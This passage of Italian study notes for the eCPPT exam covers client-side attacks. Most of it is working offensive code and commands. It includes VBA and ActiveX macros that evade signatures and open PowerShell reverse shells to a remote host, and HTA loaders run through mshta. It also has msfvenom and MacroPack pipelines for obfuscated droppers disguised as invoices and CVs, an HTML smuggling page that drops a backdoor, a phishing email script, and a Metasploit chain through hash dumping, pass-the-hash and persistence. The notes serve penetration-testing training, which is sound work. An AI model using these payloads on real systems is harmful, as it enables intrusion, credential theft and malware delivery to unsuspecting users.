Tunnel DNS → utile in reti con egress filtering HTTP/HTTPS.

---

## 9. ActiveX Controls per macro execution

### 9.1 Cos'è ActiveX
- Framework Microsoft (basato su **COM**) per componenti riutilizzabili interattivi.
- In Office: form, button, image box, web browser, media player, **InkEdit**, …
- Esegue codice arbitrario con i privilegi dell'utente che ha aperto il doc.

### 9.2 Vantaggio chiave nell'attack chain
Gli AV cercano firme di `Document_Open` / `AutoOpen` → usare ActiveX **bypassa quel signature**.
Warning all'utente: **"Active content has been disabled"** (NON "macros disabled") → meno sospetto a target meno tecnici.

### 9.3 Manuale vs Automatico
- **Manuale**: aggiungi un Button/CheckBox ActiveX → `Sub CheckBox1_Click()` esegue la macro quando l'utente clicca. Utile in pretexting ("Click here to view content").
- **Automatico**: control con evento auto-trigger (es. `InkEdit1_GotFocus`) → all'apertura del doc, il control prende focus → la sub parte → niente `Document_Open` / `AutoOpen`.

### 9.4 Tabella controls + subroutine auto-exec

| ActiveX Control | Subroutine auto-trigger |
|---|---|
| Microsoft Forms 2.0 Frame | `Frame1_Layout()` |
| Microsoft Forms 2.0 MultiPage | `MultiPage1_Layout()` |
| Microsoft Forms 2.0 ImageBox | vari `Image1_*` |
| **Microsoft InkEdit Control** | **`InkEdit1_GotFocus()`** ← preferito (invisibile + naturale) |
| Microsoft InkPicture Control | `InkPicture1_Painted()` |
| Microsoft Web Browser | `WebBrowser1_DownloadBegin()` |

### 9.5 Workflow operativo (Word) — automatic
1. Developer → Controls → **More Controls** (icona chiave inglese / "screwdriver and wrench").
2. Selezionare **Microsoft InkEdit Control** → OK.
3. Control appare come box vuoto (invisibile fuori Design Mode).
4. Right-click → **View Code**.
5. Sostituire la sub default con:
   ```vba
   Sub InkEdit1_GotFocus()
       Call MyPayload
   End Sub
   ```
6. In modulo separato:
   ```vba
   Sub MyPayload()
       CreateObject("WScript.⁠Shell").Run "calc.exe", 0, False
   End Sub
   ```
7. Save As → `.doc` (97-2003) → no `Document_Open`/`AutoOpen` necessari.

### 9.6 Apertura lato vittima
- Warning bar: **"SECURITY WARNING — Some active content has been disabled."**
- Click **Enable Content** → InkEdit acquisisce focus automaticamente → macro eseguita.

### 9.7 Pattern definitivo combo
```vba
Sub InkEdit1_GotFocus()
    Call ReverseShellPayload
End Sub

Sub ReverseShellPayload()
    Dim ps As String
    ps = "I⁠EX (New-Object Net.Web⁠Client).Download⁠String('http://10.0.0.5/powercat.ps1');" & _
         "powercat -c 10.0.0.5 -p 1337 -e cmd"
    Shell "powershell -nop -w hidden -ep bypass -c """ & ps & """", vbHide
End Sub
```

---



### Quiz: Resource Development, Weaponization, VBA Macros

<div class="ecppt-quiz" data-module="07_Client_Side_Attacks" data-block="2"></div>

## 10. HTA (HTML Applications) e `mshta.exe`

### 10.1 Cos'è un HTA
- File con **estensione `.hta`** contenente HTML + CSS + **JavaScript/VBScript**.
- Eseguito da **`mshta.exe`** (Microsoft HTML Application Host, `C:\Windows\System32\mshta.exe`).
- **Fuori dalla sandbox del browser** → gira con i **privilegi dell'utente loggato**, accede a filesystem, registry, esegue ActiveX.

### 10.2 `mshta.exe` come LOLBin
- Binary **trusted/signed Microsoft** → spesso permesso da application control (AppLocker base config).
- Frequente abuso in catene fileless: **macro → `mshta http://atk/x.hta` → JS → PowerShell**.

### 10.3 Due vie di esecuzione
1. **Browser-based (Internet Explorer)**: utente visita `http://atk/poc.hta` → IE prompt → Open → `mshta.exe` esegue. Funziona solo su IE; Edge Chromium NO. Ancora valido in **Windows Enterprise** legacy.
2. **Direct invocation**: `mshta.exe http://atk/poc.hta` (o path locale) → bypassa il browser, funziona su qualsiasi Win10/11. Tipicamente invocato da macro VBA, shortcut LNK, LOLBin chain.

### 10.4 HTA "Hello calc" minimo
```html
<html>
<head>
<script>
  new ActiveXObject("WScript.⁠Shell").Run("calc.exe");
  self.close();   // chiude finestra mshta (stealth)
</script>
</head>
<body><h1>HTA POC</h1></body>
</html>
```

### 10.5 Hosting
```bash
# Su Kali
sudo systemctl start apache2
# scrivere POC.hta in /var/www/html/
# oppure Python:
sudo python3 -m http.server 80
```

### 10.6 HTA con reverse shell PowerShell (stealth)
```html
<html><head>
<script>
  var sh = new ActiveXObject("WScript.⁠Shell");
  sh.Run('powershell -nop -w hidden -ep bypass -c "I⁠EX(New-Object Net.Web⁠Client).Download⁠String(\'http://10.0.0.5/rev.ps1\')"', 0, false);
  self.close();
</script>
</head><body></body></html>
```

### 10.7 Variante VBScript
```html
<html><head>
<HTA:APPLICATION ID="ph" WINDOWSTATE="minimize" SHOWINTASKBAR="no" />
<script language="VBScript">
  Set sh = CreateObject("WScript.⁠Shell")
  sh.Run "calc.exe", 0, False
  self.Close
</script>
</head></html>
```

### 10.8 HTA Attacks (video 020) — `msfvenom -f hta-psh`
```bash
msfvenom -p windows/shell_rev⁠erse_tcp \
  LHOST=192.168.2.134 LPORT=4444 \
  -f hta-psh -o /var/www/html/shell.hta
```
- `windows/shell_rev⁠erse_tcp` = non-staged → handlable anche con `nc`.
- Output: HTA con VBScript wrapper + payload PowerShell base64.

#### 10.8.1 Listener
```bash
nc -nvlp 4444
# oppure
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/shell_rev⁠erse_tcp; \
  set LHOST 192.168.2.134; set LPORT 4444; run"
```

#### 10.8.2 Vettore A — Browser (IE)
Vittima su Win Enterprise con IE → `http://192.168.2.134/shell.hta` → Open → Allow → shell. Privilegi: spesso `IEUser` (restricted in VM Microsoft).

#### 10.8.3 Vettore B — VBA macro che invoca mshta (universal)
```vba
Sub AutoOpen()
    ExecuteHTA
End Sub
Sub Document_Open()
    ExecuteHTA
End Sub

Sub ExecuteHTA()
    Dim url As String
    Dim cmd As String
    url = "http://192.168.2.134/shell.hta"
    cmd = "mshta.exe " & url
    Shell cmd, vbHide
End Sub
```
- Macro **non contiene il payload** — chiama solo `mshta` con URL remoto.
- Funziona su Windows moderni anche senza IE.
- Privilegi: utente che ha aperto Word (spesso full user / Admin).

### 10.9 Catena multi-stadio canonica
**doc Office → VBA macro → `mshta http://atk/x.hta` → JS → PowerShell encoded → reverse shell**

Vantaggi:
- Macro piccola (poche righe) → meno superficie di detection statica.
- Payload aggiornabile lato server senza ri-distribuire il doc.
- `mshta.exe` = LOLBin trusted.
- Encoding multiplo (base64 PS dentro VBScript dentro HTA).

---

## 11. MacroPack — automation e obfuscation

### 11.1 Cos'è
**MacroPack** = framework Python3 open-source (autore Émeric Nasi) per **automatizzare generazione + offuscamento** macro Office e altri payload script.

Due edizioni:
- **Community** (open-source).
- **Pro** (stealth avanzata, AV evasion premium).

Richiede **Microsoft Office installato su un sistema Windows** per produrre i documenti (usa COM Automation).

### 11.2 Formati supportati
- **Office**: Word (`doc`, `docm`, `dot`, `dotm`, `docx`), Excel (`xls`, `xlsm`, `xlsx`, `xltm`), PowerPoint (`pptm`, `potm`), Access (`accdb`, `mdb`).
- **Script standalone**: VBS, HTA, WSF, SCT, Shell-Link (LNK).
- **Pro-only**: CHM, symbolic-link.

### 11.3 Cosa automatizza
1. Generazione macro da template o da input arbitrario (CMD, PowerShell, VBA, msfvenom output).
2. **Offuscamento** completo: rename functions/vars/numeric constants/API imports, encoding strings, split string concatenation, rimozione spazi/commenti.
3. **Iniezione** della macro in un documento Office del formato richiesto.
4. **Cleaning metadata** del documento (rimozione hidden personal info → no attribution).

### 11.4 Cheat sheet flag principali

> 📋 La cheat sheet originalmente qui presente (flag MacroPack) è stata consolidata nel modulo dedicato: vedi [Cheat Sheet — sezione Client-Side: MacroPack](../10_Cheatsheet.md#client-side-macropack).

### 11.5 Template built-in

| Template | Comportamento |
|---|---|
| `hello` | MsgBox di test |
| **`cmd`** | Esegue comando CMD locale (input via stdin) |
| `remote_cmd` | Esegue cmd e POSTa output a HTTP server |
| **`dropper`** | Scarica + esegue exe remoto (input: URL) |
| **`dropper_ps`** | Scarica + esegue script PowerShell |
| `dropper_powershell_unc` | Esegue PS via UNC path (SMB) |
| `dropper_dll_meterpreter` | Drop + load DLL Meterpreter |
| `embed_exe` | Embedda exe nel doc (drop + exec) |
| `embed_dll` | Embedda DLL nel doc |
| `dll` | Genera solo DLL |

### 11.6 Esempi pratici

#### 11.6.1 PoC base — calc.exe offuscato in Word 97
```cmd
echo calc.exe | macropack.exe -t cmd -o -G test.doc
```
Pipeline:
1. `echo calc.exe` → input via stdin.
2. `-t cmd` → template "esegui CMD".
3. `-o` → full obfuscation.
4. `-G test.doc` → output Word 97-2003.

Tempo: ~1 minuto. MacroPack mostra: rename functions/variables/numeric constants/API imports, VBA string obfuscation, form obfuscation, rimozione hidden data.

#### 11.6.2 Pipeline MSFvenom → MacroPack (Meterpreter)
```cmd
msfvenom.bat -p windows/meter⁠preter/reverse_tcp ^
  LHOST=10.1.1.15 LPORT=4444 -f vba ^
  | macropack.exe -o -G resume.doc
```
Genera doc Word 97 con macro Meterpreter offuscata in un comando.

#### 11.6.3 Dropper Excel multi-stage
```cmd
:: Step 1 — genera lo stage finale exe
msfvenom -p windows/meter⁠preter/reverse_tcp ^
  LHOST=10.1.1.15 LPORT=5555 -f exe -o update.exe

:: Step 2 — genera doc dropper Excel
echo http://10.1.1.15/update.exe | macropack.exe -t dropper -o -G accounts_2024.xls

:: Step 3 — hosting + listener
python -m http.server 80
:: msfconsole > use exploit/multi/handler ; set PAYLOAD windows/meter⁠preter/reverse_tcp ; set LHOST 10.1.1.15 ; set LPORT 5555 ; run
```
> **ATTENZIONE**: usare `msfvenom -f exe -o file.exe` (NON `> file.exe`) — su Windows `>` rompe l'encoding binary.

MacroPack converte automaticamente `AutoOpen` → `Workbook_Open` in base al formato output.

#### 11.6.4 Dropper PowerShell con custom carrier
```cmd
echo http://10.1.1.15/empire_stager.ps1 ^
  | macropack.exe -t dropper_ps -o --template invoice_template.doc -G Invoice_Q4.doc
```

### 11.7 Caveat di obfuscation
- Sufficient per **signature-based AV** rudimentale.
- **NON sufficient** per EDR/behavior-based moderni.
- Per payload PowerShell pesanti raccomandato encoding ulteriore (Invoke-Obfus⁠cation, AMSI bypass).
- Alexis dichiara di preferire **VBA+PowerShell hand-crafted** per stealthier initial access.

---

## 12. HTML Smuggling — delivery via Blob API

### 12.1 Cos'è
**HTML Smuggling** = tecnica di **delivery** in cui il payload (exe/script/doc) è **codificato base64 dentro JavaScript** in una pagina HTML, decodificato lato client in un **Blob** e salvato sul filesystem via `<a download>` programmatico.

MITRE ATT&CK ID: **T1027.006 — Obfuscated Files or Information: HTML Smuggling**.

### 12.2 Perché funziona
- Gateway email/web filtrano in base a **content-type** e a **firme binari** (PE header, magic bytes).
- Il payload **non attraversa la rete come binario** → viaggia come stringa base64 in JS.
- Il **browser** del target ricostruisce il file localmente → nessun gateway intermedio può ispezionarlo.
- Bypassa **email filters, firewall, web proxy, IDS, EDR network-based**.

### 12.3 Workflow lab

#### 12.3.1 Step 1 — Generate payload
```bash
msfvenom -a x86 --platform windows \
  -p windows/meter⁠preter/reverse_tcp \
  LHOST=<KALI_IP> LPORT=4444 \
  -f exe -o backdoor.exe
```

#### 12.3.2 Step 2 — Encode in base64 (no wrap!)
```bash
base64 -w0 backdoor.exe > base64.txt
```
> **`-w0` = NO wrap → essenziale**, altrimenti JS `atob()` fallisce.

#### 12.3.3 Step 3 — Handler MSF
```bash
cat > /root/handler.rc <<EOF
use exploit/multi/handler
set PAYLOAD windows/meter⁠preter/reverse_tcp
set LHOST <KALI_IP>
set LPORT 4444
run
EOF
msfconsole -r /root/handler.rc
```

#### 12.3.4 Step 4 — `index.html` con smuggling
```html
<html>
<head>
<title>Documento aziendale</title>
<script>
function base64ToArrayBuffer(b64) {
  var bin = atob(b64);
  var len = bin.length;
  var bytes = new Uint8Array(len);
  for (var i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

// === PAYLOAD: incolla qui la stringa base64 di backdoor.exe ===
var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA...';
var data = base64ToArrayBuffer(file);

var blob = new Blob([data], {type: 'application/octet-stream'});
var fileName = 'msf_stage.exe';

var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';

var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
</script>
</head>
<body><h1>Loading...</h1></body>
</html>
```

#### 12.3.5 Step 5 — Avvio + delivery
```bash
sudo cp index.html /var/www/html/
sudo service apache2 start
msfconsole -r handler.rc
```
Vittima visita `http://<KALI_IP>/` → browser scarica automaticamente `msf_stage.exe` → vittima esegue → Meterpreter session.

### 12.4 API JS chiave
- **`atob(b64)`** → decodifica base64 in binary string.
- **`Uint8Array`** → buffer byte-per-byte.
- **`new Blob([data], {type:'application/octet-stream'})`** → oggetto file in memoria.
- **`URL.createObjectURL(blob)`** → URL `blob:` accessibile dal DOM.
- **`<a download>` + `.click()`** → trigger download programmatico.
- **`URL.revokeObjectURL`** → libera memoria.

### 12.5 Browser behavior moderni e mitigazioni attaccante
- Chrome/Edge/Firefox mostrano warning **"file potenzialmente dannoso"** per `.exe`.
- Mitigazioni attaccante:
  - Estensioni meno warnose: `.iso`, `.img`, `.lnk`, `.hta`, `.scr`, doc Office.
  - Wrappare in `.zip` / `.7z` (genericissimo, bypassa SmartScreen).
  - **Container `.iso`**: Windows monta automaticamente, contenuto eseguito **non eredita MOTW**.

### 12.6 APT che usano HTML smuggling
- **NOBELIUM / APT29** (SolarWinds attribution).
- **Trickbot**.
- **Qakbot**.

Vettore APT-grade, plausibile in scenari red team e domande pratiche eCPPT.

---



### Quiz: HTA, MacroPack, HTML Smuggling

<div class="ecppt-quiz" data-module="07_Client_Side_Attacks" data-block="3"></div>

## 13. Lab end-to-end #1 — Spear Phishing Attachment + pivoting (video 024)

### 13.1 Scenario
- Due target:
  - `demo.ine.local` — server SMTP DMZ, Windows Server 2012 R2, raggiungibile dall'attaccante.
  - `demo1.ine.local` — workstation interna del dipendente "Bob", **NON raggiungibile direttamente** (pivoting required).
- 1 attaccante: Kali Linux.
- Target email: `bob@ine.local`.

### 13.2 Chain completa dimostrata (template eCPPT)
**phishing → Meterpreter → `getsystem` → `autoroute` → `socks_proxy` → `proxychains nmap` → `portfwd` → exploit BadBlue (`bind_tcp`) → hash dump → `psexec` PtH → persistence (`enable_rdp`)**

### 13.3 Step 1 — Recon
```bash
nmap -F demo.ine.local      # fast scan, conferma SMTP/25
ping demo1.ine.local        # FAIL → workstation isolata
ifconfig                    # IP per LHOST
```

### 13.4 Step 2 — Payload generation
```bash
msfvenom -p windows/meter⁠preter/reverse_tcp \
         LHOST=<KALI_IP> LPORT=4444 \
         -f exe -o /root/backdoor.exe
```
Rinominato `freeantivirus.exe` lato email.

### 13.5 Step 3 — Invio email via Python `smtplib`
```python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

from_addr = "attacker@fake.net"
to_addr   = "bob@ine.local"
filename  = "freeantivirus.exe"
attach_path = "/root/backdoor.exe"

msg = MIMEMultipart()
msg["From"] = from_addr
msg["To"]   = to_addr
msg["Subject"] = "Free Antivirus"

part = MIMEBase("application", "octet-stream")
part.set_payload(open(attach_path, "rb").read())
encoders.encode_base64(part)
part.add_header("Content-Disposition", f"attachment; filename={filename}")
msg.attach(part)

with smtplib.SMTP("demo.ine.local", 25) as s:
    s.sendmail(from_addr, to_addr, msg.as_string())
```

### 13.6 Step 4 — Handler
```text
use exploit/multi/handler
set PAYLOAD windows/meter⁠preter/reverse_tcp
set LHOST <KALI_IP>
set LPORT 4444
run -j
```

### 13.7 Step 5 — Sessione + verifica raggiungibilità interna
```text
sessions -i 1
meterpreter > getuid
meterpreter > sysinfo
meterpreter > getsystem
meterpreter > shell
> ping <IP_demo1>   # OK dalla macchina compromessa
> exit
```

### 13.8 Step 6 — Pivoting: autoroute + SOCKS proxy
```text
meterpreter > run autoroute -s 10.10.20.0/28
meterpreter > background

use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050         # deve matchare /etc/proxychains.conf
run -j

jobs
netstat -antp | grep 9050
```

### 13.9 Step 7 — Recon interno via proxychains
```bash
proxychains nmap -sT -Pn -F demo1.ine.local
# REGOLA: proxychains richiede -sT (TCP connect scan), SOCKS è TCP only
# Trova porta 80 → BadBlue
```

### 13.10 Step 8 — Port forwarding per fingerprinting servizio
```text
meterpreter > portfwd add -l 1234 -p 80 -r <IP_demo1>
```
```bash
nmap -sV -p 1234 localhost
# → BadBlue 2.72 (vulnerabile)
```

### 13.11 Step 9 — Exploit BadBlue via bind payload
```text
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meter⁠preter/bind_tcp     # bind perché siamo dentro la rete
set RHOSTS <IP_demo1>
set LPORT 5555
set RPORT 80
run
```
Nuova session Meterpreter su `demo1.ine.local`.

### 13.12 Step 10 — Hash dump
```text
getuid                    # NT AUTHORITY\SYSTEM (BadBlue gira come SYSTEM)
pgrep explorer.exe
migrate <PID>             # processo 64-bit stabile
hash⁠dump                  # estrae NTLM Administrator
```

### 13.13 Step 11 — Pass-the-Hash con psexec
```text
background
use exploit/windows/smb/psexec
set RHOSTS demo1.ine.local
set SMBUser Administrator
set SMBPass <LMHASH:NTLMHASH>   # o aad3b435...:<NTLM>
set PAYLOAD windows/meter⁠preter/bind_tcp
set LPORT 6666
run
```

### 13.14 Step 12 — Persistence: enable_rdp
```text
use post/windows/manage/enable_rdp
set USERNAME alexis
set PASSWORD Password123
set SESSION <id>
run
```
User aggiunto a Administrators + Remote Desktop Users + servizio RDP abilitato.

### 13.15 Take-away esame
- **proxychains** richiede **`-sT -Pn`** per Nmap (TCP connect + skip host discovery).
- **Default SOCKS port** Metasploit moderno: **9050** (era 1080 nei tutorial vecchi).
- **`bind_tcp` vs `reverse_tcp`**: dopo autoroute usa **`bind_tcp`** (target apre porta, tu ti connetti).
- **`autoroute` aggiunge route Metasploit-side** (visibile in `route print` dentro msfconsole, NON in Linux `ip route`).
- **`hash⁠dump`** richiede SYSTEM (`getsystem` o `migrate` su processo SYSTEM).
- **PtH via psexec**: formato hash `LMHASH:NTLMHASH` o `aad3b435...:<NTLM>`.
- La chain `phishing → autoroute → socks → proxychains nmap → exploit interno` è il **template standard delle domande eCPPT**.

---

## 14. Lab end-to-end #2 — Browser shell via BeEF (video 025)

### 14.1 Cos'è BeEF
**BeEF (Browser Exploitation Framework)** = framework client-side che **aggancia (hook)** un browser via uno script JavaScript (`hook.js`) e permette controllo remoto del browser stesso.

### 14.2 Architettura
```
[Attacker]                            [Victim]
  ├─ beef-xss (porta 3000)              │
  │    ├─ /ui/panel  (control panel)    │
  │    └─ /hook.js   (hook script)      │
  │                                     │
  └─ apache2 (porta 80)                 │
       └─ index.html                    ▼
            └─ <script src=hook.js> ─── Hook fires
                                          ├─ Browser → "Online Browsers"
                                          └─ Commands eseguibili dal pannello
```

### 14.3 Workflow lab

#### 14.3.1 Setup BeEF
```bash
beef-xss
# Login http://127.0.0.1:3000/ui/panel — beef / password
```

#### 14.3.2 Pagina di hook
```html
<html><head>
<script src="http://10.10.10.5:3000/hook.js"></script>
</head><body>
<h1>Please update your browser to access the website</h1>
</body></html>
```
Salvare in `/var/www/html/index.html`.

#### 14.3.3 Payload "fake update"
```bash
msfvenom -p windows/x64/meter⁠preter/reverse_tcp \
         LHOST=<KALI_IP> LPORT=4444 \
         -f exe -o /var/www/html/update.exe
```

#### 14.3.4 Handler MSF
```text
use exploit/multi/handler
set PAYLOAD windows/x64/meter⁠preter/reverse_tcp
set LHOST <KALI_IP>
set LPORT 4444
run -j
```

#### 14.3.5 Avvio + simulazione vittima
```bash
service apache2 start
# Sul lab, AutoIt script sulla VM Windows simula apertura Firefox alla URL
```

#### 14.3.6 Comando BeEF — Fake Notification Bar (Firefox)
Pannello → **Commands → Social Engineering → Fake Notification Bar (Firefox)**:
- **Plugin URL** → `http://<KALI_IP>/update.exe`
- **Text** → "Critical: you must update your browser to view this website."
- Click **Execute** → sul browser victim appare la barra fake Firefox-style.
- Vittima clicca "Update" → scarica `update.exe` → esegue → Meterpreter.

### 14.4 Altre funzionalità BeEF mostrate
- **Logs**: tracking mouse, focus blur, click.
- **Network**: mappa dei hop, IP interno.
- **Commands → Social Engineering**: Fake Notification Bar, Text-to-Voice, Pretty Theft (login fake), Clippy.
- **Commands → Misc**: Get Clipboard, Browser AutoPwn (Metasploit integration).
- **Commands → Persistence**: Man-in-the-Browser (rewrite link/intercept submit anche al cambio pagina).
- **Commands → Network**: DNS Enumeration, port scan dal browser via WebRTC.
- **Spoof Address Bar**: cambia URL apparente nella barra.

### 14.5 Take-away esame
- **BeEF default port**: **3000** (sia panel che `hook.js`).
- **Hook script**: `http://<BeEF>:3000/hook.js`. Va incluso in `<script src="...">` di una pagina raggiungibile dal target.
- Browser hooking funziona **fino a che la pagina rimane aperta** (a meno di Man-in-the-Browser).
- **BeEF non sfrutta CVE per default** — è puro JavaScript hooking + social engineering.
- **Browser AutoPwn** prova exploit browser via MSF, dipende dal browser/CVE.
- Browser fingerprinting nel pannello: vedi browser, versione, OS, plugin, ActiveX, Flash, VBScript.

---



### Quiz: Lab end-to-end: Spear Phishing chain + BeEF

<div class="ecppt-quiz" data-module="07_Client_Side_Attacks" data-block="4"></div>

## 15. Cheat sheet `msfvenom` per client-side

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Client-Side: msfvenom payloads](../10_Cheatsheet.md#client-side-msfvenom-payloads).

---

## 16. Cheat sheet MacroPack — flag e template

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Client-Side: MacroPack](../10_Cheatsheet.md#client-side-macropack).

---

## 17. Cheat sheet PowerShell switches per macro

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Client-Side: PowerShell switches per macro](../10_Cheatsheet.md#client-side-powershell-switches-per-macro).

---

## 18. Tabelle riassuntive e flussi d'attacco

### 18.1 Flusso phishing con allegato Office (canonical)
```text
[Recon OSINT/LinkedIn]
        │
        ▼
[Pretexting design (Invoice/CV/IT upgrade)]
        │
        ▼
[VBA macro: Document_Open + AutoOpen → PowerShell dropper]
        │
        ▼
[Weaponization: .doc 97-2003, metadata coerente, MacroPack -o]
        │
        ▼
[Delivery: Gophish (Sending Profile + Template + LP + Group + Campaign)]
        │
        ▼
[Victim: Enable Content → PS → reverse shell]
        │
        ▼
[Meterpreter session → getsystem → autoroute → SOCKS → pivot interno]
```

### 18.2 Flusso HTA-based
```text
[VBA macro minimal: Shell "mshta.exe http://atk/shell.hta"]
        │
        ▼
[mshta.exe scarica + esegue HTA]
        │
        ▼
[HTA JS: new ActiveXObject("WScript.⁠Shell").Run("powershell -e <b64>")]
        │
        ▼
[Reverse shell]
```

### 18.3 Flusso HTML Smuggling
```text
[msfvenom -f exe -o backdoor.exe]
        │
        ▼
[base64 -w0 backdoor.exe > b64.txt]
        │
        ▼
[index.html: atob() → Uint8Array → Blob → <a download>.click()]
        │
        ▼
[Vittima visita pagina → download forzato → esegue → Meterpreter]
```

### 18.4 Flusso BeEF browser shell
```text
[apache2 serve index.html con <script src="http://atk:3000/hook.js">]
        │
        ▼
[Vittima visita → browser hookato → appare in Online Browsers]
        │
        ▼
[Pannello BeEF: Commands → Social Engineering → Fake Notification Bar (Firefox)]
        │     Plugin URL → http://atk/update.exe
        ▼
[Vittima clicca "Update" → download + exec → Meterpreter]
```

### 18.5 Confronto delivery techniques

| Tecnica | Stealth in transito | Stealth on-disk | Setup complexity |
|---|---|---|---|
| Email attachment `.doc` | Basso (file binario) | Medio (file visibile) | Bassa |
| Email link a download | Medio | Medio | Bassa |
| HTML Smuggling | **Alto** (solo testo HTML/JS) | Medio | Media |
| ISO/IMG wrapping | Alto (container) | **Alto** (no MOTW) | Media |
| BeEF browser hook | Alto | N/A (fileless lato hook) | Media |
| USB drop | Fisico | Medio | Alta (accesso fisico) |

### 18.6 Confronto execution techniques

| Tecnica | File su disco | Detection | Privilegi |
|---|---|---|---|
| VBA macro + msfvenom hex | Solo doc | Alta (hex blob) | User |
| VBA dropper EXE | Doc + EXE downloaded | Media (EXE su disco) | User |
| VBA + Powercat IEX | Solo doc | Bassa (in-memory) | User |
| VBA + mshta (HTA remoto) | Solo doc | Bassa | User |
| ActiveX InkEdit trigger | Solo doc | Bassa (no AutoOpen sig) | User |
| HTA standalone via `mshta.exe` | Solo .hta | Bassa (LOLBin) | User |

---

## 19. Punti d'attenzione per l'esame eCPPT

### 19.1 Terminologia (domande dirette)
- **Client-side vs server-side**: target, direzione traffico (**egress** vs ingress), user interaction.
- **Phishing vs Spear Phishing vs Whaling** (mass / targeted / executive).
- **Vishing** (voce) vs **Smishing** (SMS).
- **Pretexting** = narrativa, **non un tipo separato** ma trasversale.
- **Resource Development** (MITRE TA0042, acquisire) vs **Weaponization** (CKC fase 2, combinare).
- **HTML Smuggling** = MITRE **T1027.006**.

### 19.2 Tool/comandi più probabili
- **Gophish**: 5 building block (Sending Profile, Landing Page, Email Template, Users & Groups, Campaign). Porte: **3333 admin**, **80 phish**.
- **msfvenom -f vba / vba-exe / vba-psh / hta-psh**.
- **MacroPack**: `-t cmd|dropper|dropper_ps`, `-o`, `-G`.
- **Powercat**: `powercat -c <ip> -p <port> -e cmd` (client) / `-l -p <port> -ge` (encoded gen).
- **mshta.exe** = LOLBin che esegue `.hta`.
- **BeEF** porta **3000**, hook `/hook.js`.

### 19.3 VBA — domande probabili
- "Quale evento auto-esegue una macro all'apertura di Word?" → **`Document_Open()`** (+ `AutoOpen()`).
- "E in Excel?" → **`Workbook_Open()`**.
- "Quale estensione supporta macro?" → `.docm`, `.dotm`, `.xlsm`, `.pptm`, `.doc` (97-2003).
- "Come esegui calc.exe da macro?" → `CreateObject("WScript.⁠Shell").Run "calc.exe", 0, False`.
- "Cosa significa windowStyle=0?" → **Hidden**.

### 19.4 ActiveX
- Subroutine auto-trigger preferita: **`InkEdit1_GotFocus()`** (control invisibile).
- Warning utente: **"Active content disabled"** (NON "Macros disabled").
- Aggiungere control: **Developer → Controls → More Controls** (icona "screwdriver and wrench").

### 19.5 HTA
- Esecutore: **`mshta.exe`** (LOLBin).
- Pattern combo: **VBA macro → `Shell "mshta http://..."`** (universal su Windows moderni, no IE required).
- Privilegi: utente corrente, fuori sandbox browser.

### 19.6 Lab end-to-end (chain ricorrente esame)
**phishing → Meterpreter → `autoroute` → `socks_proxy` (porta 9050) → `proxychains nmap -sT -Pn` → `portfwd` → exploit interno con `bind_tcp` → `hash⁠dump` → `psexec` PtH → `enable_rdp`**.

Punti critici:
- `proxychains` richiede `-sT -Pn` per Nmap.
- `bind_tcp` dopo autoroute (target non può tornare a te).
- `hash⁠dump` richiede SYSTEM.
- PtH formato: `LMHASH:NTLMHASH` o `aad3b435...:NTLM`.

### 19.7 OPSEC
- Preferire **`.doc` (97-2003)** a `.docm` (icona non rivela macro).
- **Metadata** coerente col pretext (Author, Company, Title).
- **MOTW (Mark-of-the-Web)** scatena Protected View → mitigare con SMB share / ISO / USB.
- **WindowStyle Hidden** + `vbHide` per evitare flash console.

### 19.8 Pretexting
- **5 caratteristiche**: False Pretense → Establishing Trust → Manipulating Emotion → Information Gathering → Maintaining Consistency.
- **Repo standard**: **`L4bF0x/PhishingPretexts`** (GitHub).
- Pretext canonici: CV (HR), Invoice (Finance), IT upgrade (All), VPN issue, password reset.
- Leve psicologiche corporate: **fear + urgency** > greed/sympathy.

### 19.9 HTML Smuggling
- API JS chiave: **Blob**, **URL.createObjectURL**, **`<a download>`** + `.click()`.
- MIME: **`application/octet-stream`**.
- **`base64 -w0`** obbligatorio (no wrap).
- Combinabile con ISO/ZIP wrapping per bypass MOTW.

### 19.10 BeEF
- Porta default: **3000** (panel + hook.js).
- Embed: `<script src="http://<beef>:3000/hook.js"></script>`.
- Comando per shell: **Social Engineering → Fake Notification Bar (Firefox)** + payload EXE esterno.
- Persistence: **Man-in-the-Browser**.

---

## 20. Mappa dei video sorgente

| # | Video | Topic principale | Link |
|---|---|---|---|
| 01 | Course Introduction | Roadmap modulo | [01_Course Introduction.md](../Client-Side%20Attacks/01_Course%20Introduction.md) |
| 02 | Introduction to Client-Side Attacks | Definizione, metodologia 7-step | [02_Introduction to Client-Side Attacks.md](../Client-Side%20Attacks/02_Introduction%20to%20Client-Side%20Attacks.md) |
| 03 | Client-Side Attack Vectors | Tassonomia vettori | [03_Client-Side Attack Vectors.md](../Client-Side%20Attacks/03_Client-Side%20Attack%20Vectors.md) |
| 04 | Client-Side Information Gathering | Passive vs Active recon client | [04_Client-Side Information Gathering.md](../Client-Side%20Attacks/04_Client-Side%20Information%20Gathering.md) |
| 05 | Client Fingerprinting | FingerprintJS2 + Apache + UA parsing | [05_Client Fingerprinting.md](../Client-Side%20Attacks/05_Client%20Fingerprinting.md) |
| 06 | Introduction to Social Engineering | Archetipi psicologici + tipi SE | [06_Introduction to Social Engineering_1717706352952.md](../Client-Side%20Attacks/06_Introduction%20to%20Social%20Engineering_1717706352952.md) |
| 07 | Pretexting | 5 caratteristiche + templates | [07_Pretexting.md](../Client-Side%20Attacks/07_Pretexting.md) |
| 08 | Phishing with Gophish - Part 1 | Setup Gophish lab | [08_Phishing with Gophish - Part 1.md](../Client-Side%20Attacks/08_Phishing%20with%20Gophish%20-%20Part%201.md) |
| 09 | Phishing with Gophish - Part 2 | Campagna end-to-end | [09_Phishing with Gophish - Part 2.md](../Client-Side%20Attacks/09_Phishing%20with%20Gophish%20-%20Part%202.md) |
